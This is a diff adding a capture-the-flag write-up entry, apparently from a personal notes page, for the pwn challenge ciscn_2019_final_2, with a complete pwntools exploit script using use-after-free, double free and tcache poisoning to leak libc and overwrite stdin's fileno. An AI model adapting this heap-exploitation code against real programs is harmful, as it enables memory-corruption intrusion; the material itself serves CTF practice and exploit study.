@@ -717,4 +717,104 @@ icon: icon-html
 
   
 
+* ### ciscn_2019_final_2
+
+  UAF、double free、tcache attack
+
+  开局打开flag，然后dup2(fd, 666)
+
+  把stdin的fileno改成666就能打出flag
+
+  ```python
+  from pwn import *
+  #r = remote('node2.buuoj.cn.wetolink.com',28622)
+  r = process('./ciscn_final_2')
+  elf = ELF('./ciscn_final_2')
+  libc = ELF('./libc.so.6')
+  
+  def add_int(num):
+  	r.sendlineafter('command?','1')
+  	r.sendlineafter('TYPE:','1')
+  	r.sendlineafter('number:',str(num))
+  
+  def add_short_int(num):
+  	r.sendlineafter('command?','1')
+  	r.sendlineafter('TYPE:','2')
+  	r.sendlineafter('number:',str(num))
+  
+  def remove_int():
+  	r.sendlineafter('command?','2')
+  	r.sendlineafter('TYPE:','1')
+  
+  def remove_short_int():
+  	r.sendlineafter('command?','2')
+  	r.sendlineafter('TYPE:','2')
+  
+  def show_int():
+  	r.sendlineafter('command?','3')
+  	r.sendline('1')
+  	r.recvuntil("inode number :")
+  	return r.recvuntil("\n",True)
+  
+  
+  def show_short_int():
+  	r.sendlineafter('command?','3')
+  	r.sendline('2')
+  	r.recvuntil("inode number :")
+  	return r.recvuntil("\n",True)
+  
+  #leak
+  add_int(1)
+  remove_int()
+  add_short_int(2)
+  
+  remove_short_int()
+  add_int(1)
+  remove_short_int()
+  
+  fuck_addr = show_short_int()
+  fuck_addr = int(fuck_addr,10) - 0x40
+  add_short_int(fuck_addr)
+  add_short_int(fuck_addr)
+  add_short_int(0x91)
+  
+  remove_int()
+  add_short_int(2)
+  remove_int()
+  add_short_int(2)
+  remove_int()
+  add_short_int(2)
+  remove_int()
+  add_short_int(2)
+  remove_int()
+  add_short_int(2)
+  remove_int()
+  add_short_int(2)
+  remove_int()
+  add_short_int(2)
+  remove_int()
+  fuck = show_int()
+  main_arena = int(fuck,10) - 96
+  fileno = main_arena - 0x1d8
+  
+  #fuck
+  fuck_addr = fileno
+  add_int(fuck_addr)
+  add_int(1)
+  remove_int()
+  add_short_int(2)
+  remove_int()
+  fuck = show_int()
+  fuck_addr = int(fuck,10) - 0x30
+  add_int(fuck_addr)
+  add_int(fuck_addr)
+  add_int(fileno)
+  add_int(666)
+  #r.sendline('4')
+  r.interactive()
+  
+  ```
+
+  
+
 
